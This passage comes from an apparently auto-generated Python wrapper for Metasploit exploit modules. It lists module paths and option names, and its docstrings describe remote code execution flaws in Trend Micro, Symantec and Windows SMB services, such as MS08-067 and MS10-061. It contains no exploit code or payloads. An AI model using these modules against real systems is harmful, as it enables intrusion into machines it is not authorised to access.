			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_URI = 'URI'
			required_USERNAME = 'USERNAME'
			required_PASSWORD = 'PASSWORD'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_FORCE_VBS = 'FORCE_VBS'

	class windows_antivirus_trendmicro_serverprotect_earthagent(object):
		"""
		
          This module exploits a buffer overflow in Trend Micro ServerProtect 5.58 Build 1060
        EarthAgent.EXE. By sending a specially crafted RPC request, an attacker could overflow the
        buffer and execute arbitrary code.
      
		"""

		path = 'windows/antivirus/trendmicro_serverprotect_earthagent'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'

	class windows_antivirus_symantec_endpoint_manager_rce(object):
		"""
		
        This module exploits XXE and SQL injection flaws in Symantec Endpoint Protection Manager
        versions 11.0, 12.0 and 12.1. When supplying a specially crafted XML external entity (XXE) request an attacker
        can reach SQL injection affected components. As xp_cmdshell is enabled in the included
        database instance, it's possible to execute arbitrary system commands on the target
        with SYSTEM privileges.
      
		"""

		path = 'windows/antivirus/symantec_endpoint_manager_rce'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			required_TARGETURI = 'TARGETURI'

	class windows_antivirus_trendmicro_serverprotect(object):
		"""
		
          This module exploits a buffer overflow in Trend Micro ServerProtect 5.58 Build 1060.
        By sending a specially crafted RPC request, an attacker could overflow the
        buffer and execute arbitrary code.
      
		"""

		path = 'windows/antivirus/trendmicro_serverprotect'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'

	class windows_antivirus_ams_xfr(object):
		"""
		
          Symantec System Center Alert Management System is prone to a remote command-injection vulnerability
          because the application fails to properly sanitize user-supplied input.
      
		"""

		path = 'windows/antivirus/ams_xfr'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			CMD = 'CMD'

	class windows_antivirus_symantec_iao(object):
		"""
		
          This module exploits a stack buffer overflow in Intel Alert Originator Service msgsys.exe.
        When an attacker sends a specially crafted alert, arbitrary code may be executed.
      
		"""

		path = 'windows/antivirus/symantec_iao'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_antivirus_symantec_workspace_streaming_exec(object):
		"""
		
        This module exploits a code execution flaw in Symantec Workspace Streaming. The
        vulnerability exists in the ManagementAgentServer.putFile XMLRPC call exposed by the
        as_agent.exe service, which allows for uploading arbitrary files under the server root.
        This module abuses the auto deploy feature in the JBoss as_ste.exe instance in order
        to achieve remote code execution. This module has been tested successfully on Symantec
        Workspace Streaming 6.1 SP8 and Windows 2003 SP2, and reported to affect 7.5.0.x.
        Abused services listen on a single-machine deployment and also in the backend role in
        a multiple-machine deployment.
      
		"""

		path = 'windows/antivirus/symantec_workspace_streaming_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			FileDropperDelay = 'FileDropperDelay'
			required_STE_PORT = 'STE_PORT'

	class windows_antivirus_symantec_rtvscan(object):
		"""
		
          This module exploits a stack buffer overflow in Symantec Client Security 3.0.x.
        This module has only been tested against Symantec Client Security 3.0.2
        build 10.0.2.2000.
      
		"""

		path = 'windows/antivirus/symantec_rtvscan'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_antivirus_trendmicro_serverprotect_createbinding(object):
		"""
		
          This module exploits a buffer overflow in Trend Micro ServerProtect 5.58 Build 1060.
        By sending a specially crafted RPC request, an attacker could overflow the
        buffer and execute arbitrary code.
      
		"""

		path = 'windows/antivirus/trendmicro_serverprotect_createbinding'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'

	class windows_antivirus_ams_hndlrsvc(object):
		"""
		
          Symantec System Center Alert Management System is prone to a
        remote command-injection vulnerability because the application fails
        to properly sanitize user-supplied input.
      
		"""

		path = 'windows/antivirus/ams_hndlrsvc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			CMD = 'CMD'

	class windows_smb_ms04_011_lsass(object):
		"""
		
          This module exploits a stack buffer overflow in the LSASS service, this vulnerability
        was originally found by eEye. When re-exploiting a Windows XP system, you will need
        need to run this module twice. DCERPC request fragmentation can be performed by setting
        'FragSize' parameter.
      
		"""

		path = 'windows/smb/ms04_011_lsass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'

	class windows_smb_ms08_067_netapi(object):
		"""
		
          This module exploits a parsing flaw in the path canonicalization code of
        NetAPI32.dll through the Server Service. This module is capable of bypassing
        NX on some operating systems and service packs. The correct target must be
        used to prevent the Server Service (along with a dozen others in the same
        process) from crashing. Windows XP targets seem to handle multiple successful
        exploitation events, but 2003 targets will often crash or hang on subsequent
        attempts. This is just the first version of this module, full support for
        NX bypass on 2003, along with other platforms, is still in development.
      
		"""

		path = 'windows/smb/ms08_067_netapi'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SMBPIPE = 'SMBPIPE'

	class windows_smb_ms10_061_spoolss(object):
		"""
		
          This module exploits the RPC service impersonation vulnerability detailed in
        Microsoft Bulletin MS10-061. By making a specific DCE RPC request to the
        StartDocPrinter procedure, an attacker can impersonate the Printer Spooler service
        to create a file. The working directory at the time is %SystemRoot%/system32.
        An attacker can specify any file name, including directory traversal or full paths.
        By sending WritePrinter requests, an attacker can fully control the content of
        the created file.

        In order to gain code execution, this module writes to a directory used by Windows
        Management Instrumentation (WMI) to deploy applications. This directory (Wbem/Mof)
        is periodically scanned and any new .mof files are processed automatically. This is
        the same technique employed by the Stuxnet code found in the wild.
      
		"""

		path = 'windows/smb/ms10_061_spoolss'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SMBPIPE = 'SMBPIPE'
			PNAME = 'PNAME'

	class windows_smb_ms05_039_pnp(object):
		"""
		
          This module exploits a stack buffer overflow in the Windows Plug
        and Play service. This vulnerability can be exploited on
        Windows 2000 without a valid user account.

        NOTE: Since the PnP service runs inside the service.exe process, a failed
        exploit attempt will cause the system to automatically reboot.
      
		"""

		path = 'windows/smb/ms05_039_pnp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SMBPIPE = 'SMBPIPE'

	class windows_smb_psexec_psh(object):
		"""
		
          This module uses a valid administrator username and password to execute a powershell
        payload using a similar technique to the "psexec" utility provided by SysInternals. The
